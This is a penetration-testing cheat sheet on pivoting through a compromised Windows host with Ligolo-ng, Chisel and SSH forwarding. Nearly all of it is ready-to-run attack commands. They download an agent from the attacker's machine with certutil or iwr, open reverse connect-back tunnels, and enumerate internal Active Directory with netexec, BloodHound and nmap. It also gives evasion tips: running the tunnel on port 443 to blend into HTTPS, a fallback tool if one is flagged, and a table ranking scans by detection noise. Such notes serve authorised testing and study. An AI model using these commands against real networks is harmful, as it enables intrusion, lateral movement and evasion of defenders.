# Tunneling & Pivoting

---

## Ligolo-ng (Best Option)

Creates a real TUN interface on Kali - tools run natively without proxychains overhead.

### Architecture
```
Kali (attacker) <── TLS tunnel ──> Compromised Host (agent) ──> Internal Network
  [ligolo proxy]                   [ligolo agent]
```

### Step 1 - Setup on Kali
```bash
# Create TUN interface (once)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Start proxy listener
./proxy -selfcert -laddr 0.0.0.0:11601

# Use port 443 to blend into HTTPS traffic
./proxy -selfcert -laddr 0.0.0.0:443
```

### Step 2 - Transfer Agent to Windows Target
```powershell
# From Kali - serve it
python3 -m http.server 8080

# On Windows target
certutil -urlcache -split -f http://<KALI-IP>:8080/ligolo-ng_agent_windows_amd64.exe agent.exe
# Or
iwr -uri http://<KALI-IP>:8080/agent.exe -OutFile agent.exe
```

### Step 3 - Agent Connects Back
```powershell
# On Windows target
.\agent.exe -connect <KALI-IP>:11601 -ignore-cert
```

### Step 4 - Start Tunnel on Kali
In the ligolo console:
```
>> session         # Select your session
>> ifconfig        # View internal subnets
>> start           # Start the tunnel
```

Add routes for internal subnets:
```bash
sudo ip route add 192.168.1.0/24 dev ligolo
sudo ip route add 10.10.0.0/24 dev ligolo
```

### Step 5 - Use Tools Natively
```bash
netexec smb 192.168.1.0/24 -u user -p pass
nmap -sV 192.168.1.10
bloodhound-python -d domain.local -u user -p pass -dc dc01.domain.local
```

---

## Chisel (Alternative if Ligolo Gets Flagged)

```bash
# Kali - server
./chisel server -p 8000 --reverse

# Windows target - connect back with SOCKS5
.\chisel.exe client <KALI-IP>:8000 R:socks

# Edit proxychains config
nano /etc/proxychains4.conf
# socks5 127.0.0.1 1080

# Use with proxychains
proxychains netexec smb <ip> -u user -p pass
proxychains nmap -sT -Pn <ip>
```

---

## Noise Comparison

| Tool | Noise Level | Notes |
|---|---|---|
| netexec | Medium | Avoid `--shares` mass scanning |
| BloodHound (python) | Low-Med | Run from Kali via tunnel |
| ldapdomaindump | Low | LDAP is normal AD traffic |
| kerbrute | High | Lots of 4768 Kerberos events |
| nmap | High | Use `-sT` not `-sS`, limit ports |

### Quiet Enumeration Tips
```bash
# Targeted SMB (not subnet sweep)
netexec smb dc01.domain.local -u user -p pass --users

# LDAP is much quieter than SMB spraying
ldapdomaindump -u 'domain\user' -p 'pass' ldap://dc01.domain.local

# BloodHound - avoid session enum
bloodhound-python -c DCOnly -d domain.local -u user -p pass
```

---

## SSH Local Port Forwarding

```bash
# Forward remote port 8080 to localhost:8080
ssh -L 8080:127.0.0.1:8080 user@<target>

# Forward remote internal service to localhost
ssh -L 3306:10.10.0.5:3306 user@<jump-host>
```

## SSH Dynamic SOCKS Proxy

```bash
ssh -D 1080 user@<target>
# Configure proxychains to use 127.0.0.1:1080
proxychains nmap -sT <internal-ip>
```

---

## Quick Checklist for Ligolo

- [ ] Proxy listening on Kali (port 443 or 11601)
- [ ] Agent transferred (certutil or iwr)
- [ ] Agent connected back
- [ ] TUN interface up: `sudo ip link set ligolo up`
- [ ] Routes added for internal subnets
- [ ] All scanning from Kali only
